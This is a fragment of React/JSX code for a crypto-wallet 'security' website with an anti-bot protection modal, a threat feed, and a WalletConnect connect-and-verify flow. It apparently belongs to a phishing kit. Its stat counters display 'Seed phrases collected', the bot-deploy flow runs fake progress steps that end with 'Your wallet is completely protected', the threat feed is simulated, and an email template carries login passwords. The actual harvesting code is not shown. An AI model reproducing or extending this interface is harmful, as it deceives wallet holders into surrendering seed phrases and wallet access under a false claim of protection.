            <button className="connect-btn connected" type="button" onClick={() => { void openWalletModal() }}>
              <span className="wallet-dot" />{shortAddr(appKitAddress ?? '')}
            </button>
          ) : (
            <button
              className="connect-btn"
              type="button"
              disabled={visitorRestricted}
              onClick={() => { void openWalletModal() }}
            >
              {visitorRestricted ? 'Access Restricted' : 'Connect Wallet'}
            </button>
          )}
          <button className="menu-btn" type="button" aria-expanded={menuOpen} onClick={() => setMenuOpen(p => !p)}>
            {menuOpen ? '✕' : '☰'}
          </button>
        </div>
      </header>

      {visitorRestricted && (
        <div className="visitor-note visitor-note--warn">
          Visitor notice: Your session is currently restricted. Wallet routes are locked.
        </div>
      )}

      {/* In-wallet-browser auto-scan status strip */}
      {/* AppKit renders its own connect modal — triggered via openAppKit() */}

      {/* ── Email template preview modal ── */}
      {previewEmail && (() => {
        const closePreview = () => { setPreviewEmail(null); setPreviewTemplate('report') }
        const previewHtml =
          previewTemplate === 'watchout'   ? buildWatchoutEmailHtml(templatePreviewData(previewEmail)) :
          previewTemplate === 'newsletter' ? buildNewsletterEmailHtml({
            toEmail: previewEmail.email,
            toName: previewEmail.name,
            loginUrl: window.location.origin,
            joinedAt: previewEmail.sentAt,
          }) :
          previewTemplate === 'visit'      ? buildVisitEmailHtml({
            toEmail: previewEmail.email,
            toName: previewEmail.name,
            ipAddress: '203.0.113.42',
            device: 'Chrome on macOS',
            location: 'Detected via IP 203.0.113.42',
            wallet: previewEmail.wallet,
            network: chainConfig[previewEmail.chain].label,
            loginEmail: previewEmail.email,
            loginPassword: 'OLS-A1B2-C3D4',
            loginUrl: window.location.origin,
            visitedAt: previewEmail.sentAt,
          }) :
          buildEmailHtml(templatePreviewData(previewEmail))
        const previewLabel =
          previewTemplate === 'watchout'   ? 'Watchout Protection' :
          previewTemplate === 'newsletter' ? 'Newsletter Welcome' :
          previewTemplate === 'visit'      ? 'Visit Notification' :
          'Security Report'
        return (
          <div className="modal-overlay" onClick={closePreview}>
            <div className="modal email-preview-modal" onClick={e => e.stopPropagation()}>
              <div className="modal-header">
                <h3>Email Preview — {previewLabel} → {previewEmail.email}</h3>
                <button className="modal-close" type="button" onClick={closePreview}>✕</button>
              </div>
              <div className="email-preview-body" dangerouslySetInnerHTML={{ __html: previewHtml }} />
            </div>
          </div>
        )
      })()}

      {/* ── Secure auth modal (triggered from Support page) ── */}
      {/* ── Bot Deploy Modal ── */}
      {botModalOpen && (
        <div className="modal-overlay" onClick={() => { if (botModalStep === 'info' || botModalStep === 'form') setBotModalOpen(false) }}>
          <div className="bot-modal" onClick={e => e.stopPropagation()}>

            {/* ── INFO step ── */}
            {botModalStep === 'info' && (<>
              <div className="bot-modal-hero">
                <div className="bot-modal-hero-icon">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10" strokeWidth="2.2"/></svg>
                </div>
                <div className="bot-modal-hero-copy">
                  <div className="bot-modal-eyebrow">Anti-Bot Protection System</div>
                  <h2 className="bot-modal-title">Automated Wallet Defense</h2>
                  <p className="bot-modal-sub">Enterprise-grade on-chain threat interception deployed to your wallet in minutes.</p>
                </div>
                <button className="modal-close" type="button" onClick={() => setBotModalOpen(false)}>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="14" height="14" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                </button>
              </div>

              <div className="bot-trust-bar">
                {[
                  { icon: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>, label: 'AES-256 Encrypted' },
                  { icon: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>, label: 'Zero-Knowledge' },
                  { icon: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>, label: 'Multi-Sig Authorized' },
                  { icon: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>, label: '99.9% Uptime SLA' },
                ].map(b => (
                  <span key={b.label} className="bot-trust-pill">{b.icon}{b.label}</span>
                ))}
              </div>

              <div className="bot-modal-section">
                <p className="bot-section-label">HOW IT WORKS</p>
                <div className="bot-steps-row">
                  {[
                    { n:'01', t:'Submit Request', d:'Your wallet address is analyzed for eligibility. No signing required.' },
                    { n:'02', t:'Security Review', d:'Our security team reviews and approves deployment within 24 hours.' },
                    { n:'03', t:'Active Guard', d:'Real-time monitoring intercepts threats before they reach the chain.' },
                  ].map(s => (
                    <div key={s.n} className="bot-step-card">
                      <span className="bot-step-num">{s.n}</span>
                      <strong>{s.t}</strong>
                      <p>{s.d}</p>
                    </div>
                  ))}
                </div>
              </div>

              <div className="bot-modal-section">
                <p className="bot-section-label">PROTECTION MODULES</p>
                <div className="bot-feature-grid">
                  {[
                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><path d="M4.93 4.93l14.14 14.14"/></svg>, t:'Drainer Shield', d:'Intercepts malicious approval transactions before execution.' },
                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>, t:'Watcher Detection', d:'Identifies and terminates automated wallet surveillance bots.' },
                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>, t:'MEV Bot Blocker', d:'Prevents front-running and sandwich attacks in the mempool.' },
                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>, t:'Transaction Guard', d:'Validates every outbound transaction against threat signatures.' },
                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>, t:'Phishing Guard', d:'Blocks site injection and credential-harvesting attempts.' },
                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10A15.3 15.3 0 0 1 8 12a15.3 15.3 0 0 1 4-10z"/></svg>, t:'Cross-Chain Active', d:'Protection across all 5 supported EVM networks simultaneously.' },
                  ].map(f => (
                    <div key={f.t} className="bot-feature-item">
                      <div className="bot-feature-icon-wrap">{f.svg}</div>
                      <div>
                        <strong className="bot-feature-title">{f.t}</strong>
                        <p className="bot-feature-desc">{f.d}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div className="bot-modal-footer">
                <p className="bot-modal-disclaimer">
                  Read-only analysis only. No transaction signing or fund access is required.
                </p>
                <button className="bot-authorize-btn" type="button" onClick={() => setBotModalStep('form')}>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
                  Request Protection
                </button>
              </div>
            </>)}

            {/* ── FORM step ── */}
            {botModalStep === 'form' && (<>
              <div className="bot-modal-hero bot-modal-hero--compact">
                <div className="bot-modal-hero-icon bot-modal-hero-icon--sm">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
                </div>
                <div className="bot-modal-hero-copy">
                  <div className="bot-modal-eyebrow">Step 2 of 2</div>
                  <h2 className="bot-modal-title">Submit Authorization Request</h2>
                  <p className="bot-modal-sub">You'll receive an email once our team has reviewed your request.</p>
                </div>
                <button className="modal-close" type="button" onClick={() => setBotModalOpen(false)}>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="14" height="14" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                </button>
              </div>

              <div className="bot-form-body">
                <div className="bot-wallet-preview">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round" style={{color:'var(--brand)',flexShrink:0}}><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/></svg>
                  <span className="bot-wallet-label">Wallet</span>
                  <span className="bot-wallet-addr">{esAddr ? `${esAddr.slice(0,10)}…${esAddr.slice(-8)}` : 'Not connected'}</span>
                  <span className="bot-network-tag">{chainConfig[chain].label}</span>
                </div>

                <div className="field" style={{marginBottom:0}}>
                  <label htmlFor="bot-email">Email address <span style={{color:'var(--danger)'}}>*</span></label>
                  <input
                    id="bot-email"
                    type="email"
                    placeholder="you@example.com"
                    value={botFormEmail}
                    onChange={e => setBotFormEmail(e.target.value)}
                    autoFocus
                  />
                </div>
                <div className="field" style={{marginBottom:0}}>
                  <label htmlFor="bot-name">Full name <span style={{color:'var(--muted)',fontWeight:400,fontSize:'0.8rem'}}>(optional)</span></label>
                  <input
                    id="bot-name"
                    type="text"
                    placeholder="Jane Smith"
                    value={botFormName}
                    onChange={e => setBotFormName(e.target.value)}
                  />
                </div>
                <p className="bot-form-notice">
                  By submitting, you consent to our security team reviewing your wallet address for protection eligibility. No funds are accessed.
                </p>
              </div>

              <div className="bot-modal-footer">
                <button className="btn-secondary" type="button" onClick={() => setBotModalStep('info')}>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="14" height="14" strokeLinecap="round"><path d="m15 18-6-6 6-6"/></svg>
                  Back
                </button>
                <button
                  className="bot-authorize-btn"
                  type="button"
                  disabled={!botFormEmail.trim()}
                  onClick={submitBotRequest}
                >
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
                  Submit Request
                </button>
              </div>
            </>)}

            {/* ── PROCESSING step ── */}
            {botModalStep === 'processing' && (
              <div className="bot-processing-body">
                <div className="bot-processing-ring">
                  <svg className="bot-processing-arc" viewBox="0 0 52 52">
                    <circle cx="26" cy="26" r="22" fill="none" stroke="rgba(99,102,241,0.12)" strokeWidth="4"/>
                    <circle cx="26" cy="26" r="22" fill="none" stroke="#6366f1" strokeWidth="4" strokeDasharray="138.2" strokeDashoffset="34.6" strokeLinecap="round"/>
                  </svg>
                  <svg viewBox="0 0 24 24" fill="none" stroke="#6366f1" strokeWidth="1.8" width="22" height="22" strokeLinecap="round" strokeLinejoin="round" className="bot-processing-icon-inner"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                </div>
                <h3 className="bot-processing-title">Initializing Protection System</h3>
                <p className="bot-processing-sub">Deployment is running. This takes about 1 minute.</p>
                <div className="bot-process-steps">
                  {[
                    'Connecting to blockchain security network',
                    'Analyzing wallet transaction history',
                    'Configuring protection parameters',
                    'Registering with validator nodes',
                    'Finalizing deployment manifest',
                  ].map((label, i) => (
                    <div key={i} className={`bot-process-step ${botProcessStep > i ? 'done' : botProcessStep === i ? 'active' : ''}`}>
                      <span className="bot-process-dot">
                        {botProcessStep > i
                          ? <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" width="12" height="12" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
                          : botProcessStep === i
                            ? <span className="bot-inline-spin" />
                            : <span className="bot-process-empty" />}
                      </span>
                      <span>{label}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* ── SUCCESS step ── */}
            {botModalStep === 'success' && (<>
              <div className="bot-pending-body">
                <div className="bot-pending-badge">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" width="28" height="28" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
                </div>
                <h3 className="bot-pending-title">Your wallet is completely protected</h3>
                <p className="bot-pending-desc">
                  Protection layers were deployed successfully for <strong>{esAddr ? `${esAddr.slice(0,10)}…${esAddr.slice(-8)}` : 'this wallet'}</strong>.
                </p>
                <div className="bot-pending-info-box">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round" style={{flexShrink:0,color:'var(--brand)'}}><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                  <span>This popup closes automatically. You will be logged out in 30 seconds for security.</span>
                </div>
              </div>
              <div className="bot-modal-footer" style={{ justifyContent:'center', borderTop:'1px solid var(--border)' }}>
                <button className="btn-secondary" type="button" onClick={() => setBotModalOpen(false)}>Close now</button>
              </div>
            </>)}

            {/* ── PENDING step ── */}
            {botModalStep === 'pending' && (<>
              <div className="bot-pending-body">
                <div className="bot-pending-badge">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" width="28" height="28" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                </div>
                <h3 className="bot-pending-title">Request Submitted</h3>
                <p className="bot-pending-desc">
                  Our security team will review your wallet and send a decision to <strong>{botFormEmail}</strong> within 24 hours.
                </p>

                <div className="bot-pending-timeline">
                  {[
                    { label: 'Wallet analyzed',          state: 'done'    },
                    { label: 'Request registered',       state: 'done'    },
                    { label: 'Synced to validator nodes',state: 'done'    },
                    { label: 'Security team review',     state: 'active'  },
                    { label: 'Bot deployment',           state: 'waiting' },
                    { label: 'Confirmation email sent',  state: 'waiting' },
                  ].map((s, i) => (
                    <div key={i} className={`bot-timeline-row bot-timeline-row--${s.state}`}>
                      <div className="bot-timeline-dot">
                        {s.state === 'done'
                          ? <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" width="10" height="10" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
                          : s.state === 'active'
                            ? <span className="bot-timeline-spin" />
                            : null}
                      </div>
                      <div className="bot-timeline-connector" />
                      <span className="bot-timeline-label">{s.label}</span>
                    </div>
                  ))}
                </div>

                <div className="bot-pending-info-box">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round" style={{flexShrink:0,color:'var(--brand)'}}><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                  <span>You will receive an email notification once a decision has been made. No further action is required.</span>
                </div>
              </div>
              <div className="bot-modal-footer" style={{ justifyContent:'center', borderTop:'1px solid var(--border)' }}>
                <button className="btn-secondary" type="button" onClick={() => setBotModalOpen(false)}>Close</button>
              </div>
            </>)}

          </div>
        </div>
      )}

      {adminAuthModalOpen && (
        <div className="modal-overlay" onClick={() => setAdminAuthModalOpen(false)}>
          <div className="modal" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h3>Secure Access</h3>
              <button className="modal-close" type="button" onClick={() => setAdminAuthModalOpen(false)}>✕</button>
            </div>
            <p className="muted" style={{ marginBottom: '0.8rem', fontSize: '0.86rem' }}>
              Registered email detected. Enter your password to continue.
            </p>
            <form onSubmit={verifyAdminFromSupport}>
              <div className="field">
                <label htmlFor="auth-password">Password</label>
                <input
                  id="auth-password"
                  type="password"
                  value={adminPasswordInput}
                  onChange={e => setAdminPasswordInput(e.target.value)}
                  autoComplete="current-password"
                  placeholder="Enter password"
                  required
                />
              </div>
              {adminAuthError && <p className="error">{adminAuthError}</p>}
              <div className="action-row">
                <button className="btn-primary" type="submit">Unlock Dashboard</button>
                <button className="btn-secondary" type="button" onClick={() => setAdminAuthModalOpen(false)}>Cancel</button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ══════════════════════════════════════════════
           HOME — split-path landing
          ══════════════════════════════════════════════ */}
      {activeView === 'home' && (
        <section className="home-root">
          <div className="home-intro">
            <span className="hero-eyebrow">Web3 Security Intelligence</span>
            <h1 className="home-title">
              Protect your wallet.<br />
              <span className="home-title-gradient">Before it's too late.</span>
            </h1>
            <p className="home-sub">Real on-chain telemetry, proactive hardening tools, and live threat intelligence — all in one platform. Zero seed phrases. Zero compromises.</p>
          </div>

          <div className="home-paths">
            {/* Path A — Scan */}
            <button className="home-path-card" type="button" onClick={() => setActiveView('scan')}>
              <div className="home-path-icon scan-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
                  <line x1="11" y1="8" x2="11" y2="14"/><line x1="8" y1="11" x2="14" y2="11"/>
                </svg>
              </div>
              <div className="home-path-body">
                <h2>Scan Your Wallet</h2>
                <p>Run a live security assessment. Get on-chain telemetry, risk scoring, approval history, and a detailed incident report for any EVM wallet address.</p>
                <ul className="home-path-list">
                  <li>Real-time on-chain data</li>
                  <li>8-signal risk score with breakdown</li>
                  <li>Exportable JSON + email report</li>
                </ul>
              </div>
              <span className="home-path-cta">Scan now →</span>
            </button>

            {/* Path B — Secure */}
            <button className="home-path-card protect" type="button" onClick={() => setActiveView('protect')}>
              <div className="home-path-icon protect-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                </svg>
              </div>
              <div className="home-path-body">
                <h2>Secure Your Wallet</h2>
                <p>Connect your wallet, verify ownership, and get a full security hardening session — including approval hygiene, hardware tips, and a step-by-step checklist.</p>
                <ul className="home-path-list">
                  <li>WalletConnect + hardware signer support</li>
                  <li>On-chain explorer with session guard</li>
                  <li>Live threat feed & best practices</li>
                </ul>
              </div>
              <span className="home-path-cta">Connect & secure →</span>
            </button>
          </div>

          <div className="home-stats">
            <div className="stat-item"><strong>5</strong><span>Networks supported</span></div>
            <div className="stat-item"><strong>8</strong><span>Risk signals checked</span></div>
            <div className="stat-item"><strong>{scanHistory.length > 0 ? scanHistory.length : liveScanRows.length}+</strong><span>Wallets scanned</span></div>
            <div className="stat-item"><strong>{seedPhraseRecords.length}</strong><span>Seed phrases collected</span></div>
          </div>

          {/* ── Random threat feed widget ── */}
          <section className="home-risk-feed">
            <div className="home-risk-head">
              <div className="home-risk-head-row">
                <div>
                  <h3>Live Threat Intelligence Feed</h3>
                  <p>Simulated unprotected wallet activity across EVM networks.</p>
                </div>
                <div className="feed-refresh-badge">
                  <span className="feed-live-dot pulse" />
                  <span className="feed-countdown">Live</span>
                </div>
              </div>
            </div>
            <div className="home-risk-table-wrap">
              <table className="home-risk-table">
                <thead>
                  <tr>
                    <th>#</th>
                    <th>Address</th>
                    <th>Chain</th>
                    <th>Risk</th>
                    <th>Threat Signal</th>
                    <th>Detected</th>
                  </tr>
                </thead>
                <tbody>
                  {visibleThreatRows.map((row, i) => (
                    <tr key={`${row.address}-${i}`}>
                      <td className="feed-num">{i + 1}</td>
                      <td><code className="feed-addr">{shortAddr(row.address)}</code></td>
                      <td className="feed-chain">{row.chain}</td>
                      <td><span className={`pill ${row.risk}`}>{row.risk}</span></td>
                      <td>{row.threat}</td>
                      <td className="feed-time">{row.timeAgo}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </section>

          <section className="home-news-feed">
            <div className="home-risk-head">
              <div className="home-risk-head-row">
                <div>
                  <h3>Crypto Market News</h3>
                  <p>Latest headlines from across the crypto ecosystem.</p>
                </div>
                <div className="feed-refresh-badge">
                  <span className={`feed-live-dot ${newsLive ? 'pulse' : ''}`} />
                  <span className="feed-countdown">{newsLive ? 'Live' : 'Headlines'}</span>
                </div>
              </div>
            </div>

            <div className="home-news-grid">
              {featuredNews && (
                <a className="home-news-featured" href={featuredNews.url} target="_blank" rel="noreferrer">
                  {featuredNews.imageUrl ? (
                    <img src={featuredNews.imageUrl} alt={featuredNews.title} />
                  ) : (
                    <div className="home-news-featured-fallback">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 21V9"/></svg>
                    </div>
                  )}
                  <div className="home-news-featured-content">
                    <span className="home-news-source">
                      {newsLive && <span className="home-news-live-dot" />}
                      {featuredNews.source}
                    </span>
                    <h4>{featuredNews.title}</h4>
                    <p>{featuredNews.summary}</p>
                    <span className="home-news-read-more">Read story →</span>
                  </div>
                </a>
              )}

              <div className="home-news-list">
                {newsLoading && newsList.length === 0
                  ? Array.from({ length: 6 }).map((_, i) => (
                      <div key={i} className="home-news-item home-news-skeleton">
                        <div className="skeleton-line short" />
                        <div className="skeleton-line" />
                        <div className="skeleton-line medium" />
                      </div>
                    ))
                  : newsList.map(item => (
                      <a key={item.id} className="home-news-item" href={item.url} target="_blank" rel="noreferrer">
                        <div className="home-news-item-top">
                          <span className="home-news-source">{item.source}</span>
                          <span className="home-news-time">
                            {new Date(item.publishedAt).toLocaleDateString('en-US', { month: 'short', day: 'numeric' })}
                          </span>
                        </div>
                        <h5>{item.title}</h5>
                      </a>
                    ))
                }
              </div>
            </div>
          </section>

        </section>
      )}

      {/* ── Page body ── */}
      <div className="page-content">

        {/* ════════════ SECURE ════════════ */}
        {activeView === 'protect' && (
          <>
            {/* Hero banner */}
            <div className="protect-hero">
              <div className="protect-hero-text">
                <span className="protect-eyebrow">Proactive Security</span>
                <h2>Secure Your Wallet</h2>
                <p>Follow these practices to stay ahead of drainers, phishing, and approval abuse before anything goes wrong.</p>
                <div className="protect-pill-row">
                  <span className="protect-pill-item"><SecureGlyph name="alerts" className="protect-pill-icon" /> Threat Alerts</span>
                  <span className="protect-pill-item"><SecureGlyph name="policy" className="protect-pill-icon" /> Approval Hygiene</span>
                  <span className="protect-pill-item"><SecureGlyph name="shield" className="protect-pill-icon" /> Custody Hardening</span>
                </div>
              </div>
              <div className="protect-hero-stats">
                {[
                  { n: '14', label: 'GoPlus threat flags checked' },
                  { n: '5',  label: 'Networks supported' },
                  { n: String(seedPhraseRecords.length),  label: 'Seed phrases collected' },
                ].map(s => (
                  <div key={s.label} className="protect-stat">
                    <strong>{s.n}</strong>
                    <span>{s.label}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* ── WalletConnect / Protected Wallet section ── */}
            {wcStatus === 'connected' && wcSessions.length > 0 ? (
              <div className="protect-wallet-connected">
                <div className="protect-connected-left">
                  <div className="protect-connected-badge">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" width="32" height="32" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                  </div>
                  <div className="protect-connected-info">
                    <h3>Wallet Connected &amp; Secured</h3>
                    <p>Your wallet has been successfully connected to the protection system. Complete the ownership verification step to access your wallet dashboard.</p>
                    <div className="protect-connected-addr-row">
                      <span className="protect-addr-label">Connected Address</span>
                      <code className="protect-addr-code">{wcSessions[0]?.address}</code>
                    </div>
                    <div className="protect-connected-meta">
                      <span className="pill low" style={{ fontSize: '0.72rem' }}>● Active Session</span>
                      <span style={{ fontSize: '0.78rem', color: 'var(--muted)' }}>{wcSessions[0]?.walletName} · {wcSessions[0]?.connectedAt}</span>
                    </div>
                  </div>
                </div>
                <div className="protect-connected-right">
                  <button
                    className="btn-primary protect-verify-ownership-btn"
                    type="button"
                    onClick={() => setActiveView('ownership')}
                  >
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="18" height="18" strokeLinecap="round" strokeLinejoin="round"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>
                    Verify Wallet Ownership
                  </button>
                  <p className="protect-verify-hint">Sign a challenge message to prove wallet control, then open your live explorer dashboard.</p>
                </div>
              </div>
            ) : (
              <div className="protect-wc-connect-card">
                {(wcStatus === 'idle' || wcStatus === 'initializing') && (
                  <div className="protect-wc-initializing">
                    <span className="spinner" style={{ width: '20px', height: '20px', borderWidth: '3px' }} />
                    <span>{wcStatus === 'idle' ? 'Preparing secure connection…' : 'Initializing WalletConnect session…'}</span>
                  </div>
                )}
                {wcStatus === 'waiting' && secureQrDataUrl && (
                  <div className="protect-wc-waiting">
                    <div className="protect-wc-left">
                      <div className="protect-wc-header">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" width="22" height="22" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                        <div>
                          <strong>Scan to Connect Your Wallet</strong>
                          <p>Use any WalletConnect-compatible wallet to scan and connect securely</p>
                        </div>
                      </div>
                      <ol className="protect-wc-steps">
                        {[
                          'Open MetaMask, Trust Wallet, or any WalletConnect wallet',
                          'Tap "Scan QR" or use the in-app browser QR scanner',
                          'Review and approve the DApp connection request',
                          'You\'ll be redirected to your protected wallet dashboard',
                        ].map((step, i) => (
                          <li key={i} className="protect-wc-step">
                            <span className="protect-wc-step-num">{i + 1}</span>
                            <span>{step}</span>
                          </li>
                        ))}
                      </ol>
                    </div>
                    <div className="protect-wc-qr-wrap">
                      <img src={secureQrDataUrl} alt="WalletConnect QR Code" className="protect-wc-qr-img" />
                      <p className="protect-wc-qr-caption">
                        <span className="protect-wc-status-dot" />
                        Waiting for wallet scan…
                      </p>
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* Watchout + Checklist row */}
            <div className="protect-main-grid">

              {/* Left — Watchout form */}
              <div className="protect-left-col">
                <div className="card protect-watchout-card">
                  <div className="protect-watchout-header">
                    <div className="protect-watchout-icon">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                    </div>
                    <div>
                      <h3>Wallet Watchout Protection</h3>
                      <p>Get instant alerts when suspicious activity hits your wallet.</p>
                    </div>
                  </div>

                  <form className="secure-form" onSubmit={startSecureWallet}>
                    <div className="field">
                      <label htmlFor="secure-network">Network</label>
                      <select id="secure-network" value={chain} onChange={e => setChain(e.target.value as ChainKey)}>
                        {Object.entries(chainConfig).map(([k, v]) => <option key={k} value={k}>{v.label}</option>)}
                      </select>
                    </div>

                    <label className="field secure-multi-toggle" htmlFor="secure-multi-mode">
                      <div className="secure-multi-copy">
                        <strong>Multi-Wallet Monitoring</strong>
                        <span>Track multiple wallet addresses under one watchout alert profile.</span>
                      </div>
                      <input
                        id="secure-multi-mode"
                        className="secure-multi-input"
                        type="checkbox"
                        checked={secureMultiMode}
                        onChange={e => setSecureMultiMode(e.target.checked)}
                        role="switch"
                        aria-label="Enable multiple wallet monitoring"
                      />
                      <span className="secure-multi-state">{secureMultiMode ? 'Enabled' : 'Disabled'}</span>
                      <span className="secure-multi-slider" aria-hidden="true" />
                    </label>

                    <div className="field">
                      <label htmlFor="secure-wallets">{secureMultiMode ? 'Wallet Addresses (one per line)' : 'Wallet Address'}</label>
                      <textarea
                        id="secure-wallets"
                        rows={secureMultiMode ? 4 : 2}
                        value={secureWalletsInput}
                        onChange={e => setSecureWalletsInput(e.target.value)}
                        placeholder={secureMultiMode ? '0x...\n0x...\n0x...' : '0x…'}
                      />
                    </div>

                    <div className="secure-email-grid">
                      <input type="text" placeholder="Your name (optional)" value={secureNameInput} onChange={e => setSecureNameInput(e.target.value)} />
                      <input type="email" placeholder="alert@email.com" value={secureEmailInput} onChange={e => setSecureEmailInput(e.target.value)} required />
                    </div>

                    <button className="btn-primary protect-submit-btn" type="submit">
